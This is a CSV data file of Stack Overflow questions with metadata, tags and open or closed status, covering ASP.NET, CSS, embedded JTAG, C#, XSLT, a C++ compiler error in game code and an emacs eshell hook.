PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus
11736111,07/31/2012 08:33:16,872998,08/01/2011 14:57:05,102,5,create a custom profile class but error in subfolder,"I am working with mvc 3 jquery mobile project.
I crated a custom profile class in project to save in aspnet_profile table with the help of:
http://weblogs.asp.net/jgalloway/archive/2008/01/19/writing-a-custom-asp-net-profile-class.aspx .and in my server i have subfolder called 'admin' and i placed some aspx files in it. when i accessing like http://www.mywebsite.com/admin it gives error( The type or namespace name 'Root' could not be found (are you missing a using directive or an assembly reference?) ).but it works fine like http://www.mywebsite.com. ",asp.net,asp.net-mvc-3,profile,,,,open
8389569,12/05/2011 17:47:53,888139,08/10/2011 14:45:15,102,2,CSS: select element preceded by a sibling element,"I have something similar to the following:

    <ul id=""list-cats"">
       <li><img src=""..."" alt="""" /><a href=""#"">test 1</a></li>
       <li><img src=""..."" alt="""" /><a href=""#"">test 2</a></li>
       <li><img src=""..."" alt="""" /><a href=""#"">test 2</a></li>
    </ul>


    ul#list-cats li {border:1px solid red;}
    ul#list-cats li li {border:1px solid cyan;}

This is from the w3c documentation:

E + F	Matches any F element immediately preceded by a sibling element E.

Why dont all the other ""li"" tags get a cyan border?


PS: i know this can be done using the first:child selector... but, i want to figure this problem out",css,selector,,,,02/10/2012 12:52:42,too localized
11496286,07/15/2012 22:46:24,1527464,07/15/2012 21:07:55,1,0,Programming STM32-p207 using JTAG,"I am a newbie learning to do ARM development.
I have the following development hardware
Olimex STM32-P207 (https://www.olimex.com/dev/stm32-p207.html)
Olimex ARM-USB-TINY-H 

The STM32-P207 user guide mentions the following-

*""Note: additionally, the board can be programmed via JTAG interface but there are signals
multiplexed with the LCD and the audio, so if using JTAG interface for programming you might
need to implement a software mechanism to stop them or you might not be able to reprogram again""*

Can anyone explain me what exactly needs to be done so that I don't mess up with my new board?
Thank you. ",embedded,arm,development-environment,stm32,jtag,07/15/2012 22:48:27,off topic
3403247,08/04/2010 06:55:05,348311,05/23/2010 14:58:10,173,9,Dealing with file properties C#,"I want to get the file size of any given file using the C#, and I need to show it in GB, MB, KB and bytes if possible ...

and for audio (mp3) files, I need to get the duration of the file ...",c#,filesystems,,,,,open
10721364,05/23/2012 13:49:32,1166690,01/24/2012 09:52:21,814,4,XSLT output method while signing?,"I am using XSLT transform in my xmlsignatures. The XSLT template's output value is **HTML** like this

    <xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"">
    <xsl:output method=""html"" version=""4.0"" encoding=""iso-8859-1"" indent=""yes""/>

I have to use this XSLT in two places <br>
**1) While Signing the XML document with XSLT transform**<br>
**2) While Rendering the values specified by XSLT from signed document**<br><br>
What is bothering me is that When I sign the document with XSLT transform, Will the following line gets executed 
 

    <xsl:output method=""html"" version=""4.0"" encoding=""iso-8859-1"" indent=""yes""/>
**If its executed then Where will be the HTML file shown?**",java,html,xslt,xpath,xml-signature,05/25/2012 03:56:36,not a real question
3060824,06/17/2010 10:28:40,358450,06/04/2010 12:47:51,81,0,css sprite navigation,"Is it possible to use three images in CSS sprite navigation?

This may be like this

![My image][1]


  [1]: http://img710.imageshack.us/img710/1429/navigx.jpg",html,css,css-sprites,,,,open
1537043,10/08/2009 10:50:47,120497,06/10/2009 12:30:21,15,0,Caching IEnumerable,"    public IEnumerable<ModuleData> ListModules()
    {
        foreach (XElement m in Source.Descendants(""Module""))
        {
            yield return new ModuleData(m.Element(""ModuleID"").Value);
        }
    }

Initially the above code is great since there is no need to evaluate the entire collection if it is not needed.

However, once all the Modules have been enumerated once, it becomes more expensive to repeatedly query the XDocument when there is no change.

So, as a performance improvement:

    public IEnumerable<ModuleData> ListModules()
    {
        if (Modules == null)
        {
            Modules = new List<ModuleData>();
            foreach (XElement m in Source.Descendants(""Module""))
            {
                Modules.Add(new ModuleData(m.Element(""ModuleID"").Value, 1, 1));
            }
        }
        return Modules;
    }

Which is great if I am repeatedly using the entire list but not so great otherwise.

Is there a middle ground where I can yield return until the entire list has been iterated, then cache it and serve the cache to subsequent requests?

",ienumerable,yield,return,,,,open
3241968,07/13/2010 22:11:24,47086,12/17/2008 15:24:53,351,36,Charateristics and features of every software framework,"I was trying to find an answer for my question today using google and StackOverflow search engines... but no luck :)

I was wondering what are the key features of every framework for end user, and how can you characterize every framework from the end-user point of view (I've looked into Framework Design Guidelines by K. Cwalina, but I've found only concepts and guidelines for framework architects), for me:

 - it should be extensible
 - should let build extensible and reusable component

I think there is much more out there.
 
Please share your knowledge.",language-agnostic,frameworks,framework,features,characteristics,,open
9338678,02/18/2012 04:52:38,1202349,02/10/2012 15:40:43,42,1,What is the main difference between Agile Software Development & Extreme Programming?,"Title has it. Just to have an idea, pointing to some good links with documentations are good enough.",project-management,agile,extreme-programming,,,02/18/2012 04:59:16,off topic
2843279,05/16/2010 10:00:30,302954,03/26/2010 23:55:39,11,0,Asp.Net Cookie sharing,"This is C#.Net code:

How to share Cookie between 2 HttpWebRequest calls?

Details:

I am posting a form in first request, this form contains some setting variables which are used by the system. lets say there is a input field in the form which sets the size of grid pages to be displayed in other pages.

Once i have updated the setings in previous request, i go to send a request to another page which shows off asp.net gridview/grid. The grid might contaian several pages and the page size should be the one which i set in previous request. But when i do this via HttpWebReeust it does not happen. 

When i do it via browser, loading the setting page in the browser and then going to the grid view page... i see the page size is updated. 

I want to achieve this via code. Sicne i am scraping this grid. i have to set page size or visit the gird pages one by one via code.

Or is it possible to set a cookie on 2nd request which is used to set in first request? It will be great if i go this way. any solution?",asp.net,gridview,setcookie,,,,open
8877240,01/16/2012 08:18:54,665557,03/18/2011 05:25:07,551,2,LIKE Buttons from Facebook Using Open Graph API,"I have a website that has movies and reviews. On a particular movie page, I have a movie title and a Facebook like button. I want this like button to use the Open Graph API. But beneath the movie, I have reviews that also have like buttons. I want these reviews to not use the graph API and just use the link to the review as the like.

Is this possible?
",facebook,facebook-graph-api,facebook-like,,,,open
8098803,11/11/2011 19:15:47,1042276,11/11/2011 18:52:53,1,0,error C2593: 'operator =' is ambiguous,"when i compile in VS 2003 ent i get these errors

    C:\SRC\Program\_Interface\FuncTextCmd.cpp(953): error C2593: 'operator =' is ambiguous
    C:\SRC\Program\_Interface\FuncTextCmd.cpp(958): error C2593: 'operator =' is ambiguous
    C:\SRC\Program\_Interface\FuncTextCmd.cpp(963): error C2593: 'operator =' is ambiguous
    C:\SRC\Program\_Interface\FuncTextCmd.cpp(968): error C2593: 'operator =' is ambiguous
    C:\SRC\Program\_Interface\FuncTextCmd.cpp(973): error C2593: 'operator =' is ambiguous
    C:\SRC\Program\_Interface\FuncTextCmd.cpp(978): error C2593: 'operator =' is ambiguous
    C:\SRC\Program\_Interface\FuncTextCmd.cpp(982): error C2593: 'operator =' is ambiguous


this is this part of FuncTextCmd.cpp it's referring to

    BOOL TextCmd_CHANGEGLOW( CScanner& scanner )
    {//98
    #ifdef __WORLDSERVER
    CUser* pUser	= (CUser*)scanner.dwValue;
    scanner.GetToken();
    CString strcr = scanner.Token;
    CString CHANGEGLOW;


    if( 2 <= strcr.GetLength() && strcr.GetLength() <= 7)
    {
    strcr.MakeLower();

    if( strcmp( strcr, ""RED"" ) == 0 )
    {
    CHANGEGLOW = 1;//line 953
    }
    else
    if( strcmp( strcr, ""BLUE"" ) == 0 )
    {
    CHANGEGLOW = 2;//line 958
    }
    else
    if( strcmp( strcr, ""GREEN"" ) == 0 )
    {
    CHANGEGLOW = 3;//line 963
    }
    else
    if( strcmp( strcr, ""YELLOW"" ) == 0 )
    {
    CHANGEGLOW = 4;//line 968
    }
    else
    if( strcmp( strcr, ""ORANGE"" ) == 0 )
    {
    CHANGEGLOW = 5;//line 973
    }
    else
    if( strcmp( strcr, ""PINK"" ) == 0 )
    {
    CHANGEGLOW = 6;//line 978
    }
    else if( strcmp( strcr, ""PURPLE"" ) == 0 )
    {
    CHANGEGLOW = 7;//line 982
    }
    else
    {
    strcr += ""unknown glow"";
    pUser->AddText( strcr );
    return FALSE;
    }
    }
    else
    {
    strcr += ""unknown glow"";
    pUser->AddText( strcr );
    return FALSE;

    }//2
	
    #endif // __WORLDSERVER
	return TRUE;
    }


this is for a game by the way it's in c++ 

the part above is saying if the user types said colors in the chat box then the glow around their body will change to what they typed but this is only the command the main part of this feature is handled in Mover.cpp of my source then part for glow can be seen below

    void CMover::CreateAbilityOption_SetItemSFX( int nAbilityOption )
    {
    extern DWORD CHANGEGLOW;
    DWORD dwSfx = 0;

    switch( nAbilityOption )
    {
    case 3: dwSfx = XI_GEN_ITEM_SETITEM03; break;
    case 4: dwSfx = XI_GEN_ITEM_SETITEM04; break;
    case 5: dwSfx = XI_GEN_ITEM_SETITEM05; break;
    case 6: dwSfx = XI_GEN_ITEM_SETITEM06; break;
    case 7: dwSfx = XI_GEN_ITEM_SETITEM07; break;
    case 8: dwSfx = XI_GEN_ITEM_SETITEM08; break;
    case 9: dwSfx = XI_GEN_ITEM_SETITEM09; break;
    case 10: dwSfx = CHANGEGLOW; break;
    }

    switch( CHANGEGLOW )
    {
    case 1: dwSfx = RED; break; //make sure that the uppercase RED is what
    //you defined in defineobj.h
    case 2: dwSfx = BLUE; break; //make sure that the uppercase BLUE is what
    // you defined //in defineobj.h
    case 3: dwSfx = GREEN; break; //make sure that the uppercase GREEN is what you
    //defined in defineobj.h
    case 4: dwSfx = YELLOW; break; //make sure that the uppercase YELLOW is what you
    //defined in defineobj.h
    case 5: dwSfx = ORANGE; break; //make sure that the uppercase ORANGE is what you
    //defined in defineobj.h
    case 6: dwSfx = PINK; break; //make sure that the uppercase PINK is what you
    //defined in defineobj.h
    case 7: dwSfx = PURPLE; break; //make sure that the uppercase PURPLE is what you
    //defined in defineobj.h
    }

    //else 
    //case 10: dwSfx = XI_GEN_ITEM_SETITEM10; break;

	
	CSfxPartsLinkShoulder* pSfx = NULL;
	D3DXVECTOR3 v3Scal = D3DXVECTOR3( 1.0f, 1.0f, 1.0f );

	
	if( nAbilityOption == 3 )
	{
		// ¾î±ú
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 0;
		pSfx->m_v3Offset.y = 0.1f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 1;
		pSfx->m_v3Offset.y = 0.1f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
	}
	/*
	else
	if( nAbilityOption == 4 )
	{
		// ¸öÅë
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 6;
		pSfx->SetScale(D3DXVECTOR3( 2.2f, 2.2f, 2.2f ));
	}
	*/
	else
	if( nAbilityOption == 4 )
	{
		// ¸öÅë
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 6;
		pSfx->SetScale(D3DXVECTOR3( 3.0f, 3.0f, 3.0f ));
		pSfx->m_nOldAbilityOption = nAbilityOption;
	}
	else
	if( nAbilityOption == 5 )
	{
		// ¾î±ú
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 0;
		pSfx->m_v3Offset.y = 0.1f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 1;
		pSfx->m_v3Offset.y = 0.1f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		// ¾î±ú, ÆÈ¸ñ Áß°£
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 4;		
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 5;	
		pSfx->m_nOldAbilityOption = nAbilityOption;
	}
	else
	if( nAbilityOption == 6 )
	{
		// ¾î±ú
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 0;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 1;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		// ¾î±ú, ÆÈ¸ñ Áß°£
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 4;		
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 5;	
		pSfx->m_nOldAbilityOption = nAbilityOption;
		// ÆÈ¸ñ
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 2;
		pSfx->m_v3Offset.y = 0.1f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 3;		
		pSfx->m_v3Offset.y = 0.1f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
	}
	else
	if( nAbilityOption == 7 )
	{
		// ¾î±ú
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 0;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 1;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		// ¾î±ú, ÆÈ¸ñ Áß°£
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 4;		
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 5;	
		pSfx->m_nOldAbilityOption = nAbilityOption;
		// ÆÈ¸ñ
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 2;
		pSfx->m_v3Offset.y = 0.1f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 3;		
		pSfx->m_v3Offset.y = 0.1f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		// ¼Õ	
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 8;			
		pSfx->m_v3Offset.y = 0.1f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 9;		
		pSfx->m_v3Offset.y = 0.1f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
	}
	else
	if( nAbilityOption == 8 )
	{
		// ¾î±ú
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 0;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 1;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		// ¾î±ú, ÆÈ¸ñ Áß°£
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 4;		
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 5;	
		pSfx->m_nOldAbilityOption = nAbilityOption;
		// ÆÈ¸ñ
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 2;
		pSfx->m_v3Offset.y = 0.1f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 3;		
		pSfx->m_v3Offset.y = 0.1f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		// ¼Õ	
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 8;			
		pSfx->m_v3Offset.y = 0.1f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 9;		
		pSfx->m_v3Offset.y = 0.1f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, XI_SETIEM_EFFECTHAND, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 9;			
		pSfx->m_v3Offset.y = 0.2f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
	}
	else
	if( nAbilityOption == 9 )
	{
		// ¾î±ú
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 0;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 1;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		// ¾î±ú, ÆÈ¸ñ Áß°£
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 4;		
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 5;	
		pSfx->m_nOldAbilityOption = nAbilityOption;
		// ÆÈ¸ñ
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 2;
		pSfx->m_v3Offset.y = 0.1f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 3;		
		pSfx->m_v3Offset.y = 0.1f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		// ¼Õ	
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 8;			
		pSfx->m_v3Offset.y = 0.1f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 9;		
		pSfx->m_v3Offset.y = 0.1f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		// ¹ß
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 26;	
		pSfx->SetScale(D3DXVECTOR3( 1.5f, 1.5f, 1.5f ));		
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 29;
		pSfx->SetScale(D3DXVECTOR3( 1.5f, 1.5f, 1.5f ));
		pSfx->m_nOldAbilityOption = nAbilityOption;
		
		
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, XI_SETIEM_EFFECTHAND, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 9;			
		pSfx->m_v3Offset.y = 0.2f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
	}
	else
	if( nAbilityOption == 10 )
	{
		// ¾î±ú
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 0;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 1;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		// ¾î±ú, ÆÈ¸ñ Áß°£
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 4;		
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 5;	
		pSfx->m_nOldAbilityOption = nAbilityOption;
		// ¸öÅë
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 6;
		pSfx->SetScale(D3DXVECTOR3( 3.0f, 4.5f, 3.0f ));
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 7;		
		pSfx->SetScale(D3DXVECTOR3( 3.0f, 3.0f, 3.0f ));		
		pSfx->m_nOldAbilityOption = nAbilityOption;
		// ¼Õ	
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 8;			
		pSfx->m_v3Offset.y = 0.1f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 9;	
		pSfx->m_v3Offset.y = 0.1f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		// ÆÈ¸ñ
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 2;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 3;		
		pSfx->m_nOldAbilityOption = nAbilityOption;
		// ¹ß
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 26;			
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, dwSfx, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 29;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		

		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, XI_SETIEM_EFFECTHAND, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 8;			
		pSfx->m_v3Offset.y = 0.2f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
		pSfx = (CSfxPartsLinkShoulder*)CreateSfx( D3DDEVICE, XI_SETIEM_EFFECTHAND, GetPos(), GetId(), GetPos(), GetId(), -1 );
		pSfx->m_nPartsLink = 9;			
		pSfx->m_v3Offset.y = 0.2f;
		pSfx->m_nOldAbilityOption = nAbilityOption;
	}
    }

    #endif //__CLIENT

 ",c++,compiler-errors,,,,11/12/2011 17:52:14,too localized
9099475,02/01/2012 16:31:26,861550,07/25/2011 12:23:42,1,1,Does JQuery are crawled by google?,"Does the HTML that are rendered in the JQuery ""$(document).ready"" are crawled by Google ?",jquery,crawling,,,,06/14/2012 13:10:31,off topic
9420270,02/23/2012 19:56:24,122230,06/12/2009 19:09:36,1,1,How to define an alternate command for emacs eshell,"I'm trying to start using eshell in place of bash within emacs, but I rely heavily on bash functions that I have written over the years.  I'd like to configure eshell to invoke bash whenever a ""command not found"" condition occurs, in case the command in question is implemented as a bash function.

There is a variable tantalizingly named eshell-alternate-command-hook that sounds like it is made to order, but my lack of elisp skill is interfering with my success I think.

This is my best effort:

    (add-hook 'eshell-alternate-command-hook 'invoke-bash t t)
    (defun invoke-bash (command args)
      (throw 'eshell-replace-command
         (list ""bash -c"" command args)))

But when I test it, it doesn't work:

    c:/temp $ lsd
    Wrong number of arguments: (lambda (command args) (throw (quote eshell-replace-command) (list ""bash -c"" command args))), 1
    c:/temp $ ",emacs,eshell,,,,,open
